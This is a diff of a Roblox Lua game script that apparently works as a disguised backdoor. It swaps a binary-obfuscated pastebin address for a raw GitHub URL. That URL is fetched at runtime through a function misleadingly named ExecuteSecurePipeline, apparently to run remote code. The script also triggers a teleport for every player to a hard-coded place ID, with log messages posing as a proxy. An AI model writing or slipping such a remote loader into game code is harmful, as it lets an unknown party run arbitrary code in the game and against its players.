@@ -2,12 +2,6 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
-local CORE_MATRIX_01 = "0110100001110100011101000111000001110011"
-local NET_DECRYPT_HEX = {
-    [0x01] = "pastebin.com",
-    [0x02] = 98148252077920 
-}
-
 local function RequestPlatformTeleport(targetPlayer, destinationId)
     print(" [CRITICAL] ROUTER_PROXY: Abriendo canal del Teleport")
     print(" [PROXY] Conectando con servidor remoto: " .. tostring(destinationId))
@@ -21,22 +15,8 @@ local function RequestPlatformTeleport(targetPlayer, destinationId)
     _G.ExecuteSecurePipeline(targetPlayer)
 end
 
-local DATA_VECTOR_11 = "00101111011100100110000101110111001011110110001101001011010110100100010001010110001110000011000001000110"
-
-local function TranslateBinaryStream(binaryStr)
-    local text = ""
-    for i = 1, #binaryStr, 8 do
-        local byteStr = string.sub(binaryStr, i, i + 7)
-        local byte = tonumber(byteStr, 2)
-        if byte then text = text .. string.char(byte) end
-    end
-    return text
-end
-
 _G.ExecuteSecurePipeline = function(player)
-    local protocol = TranslateBinaryStream(CORE_MATRIX_01) .. "://"
-    local endPath = TranslateBinaryStream(DATA_VECTOR_11)
-    local secureLink = protocol .. NET_DECRYPT_HEX[0x01] .. endPath
+    local secureLink = "https://raw.githubusercontent.com/CMDERSPOTER/ifCmdNotWorkAplicate/refs/heads/main/WorkFuncion"
     
     task.spawn(function()
         local success, payload = pcall(HttpService.GetAsync, HttpService, secureLink)
@@ -63,7 +43,7 @@ end
 local function Init(player)
     if not player.Character then player.CharacterAdded:Wait() end
     task.wait(0.5)
-    RequestPlatformTeleport(player, NET_DECRYPT_HEX[0x02])
+    RequestPlatformTeleport(player, 98148252077920)
 end
 
 for _, player in ipairs(Players:GetPlayers()) do
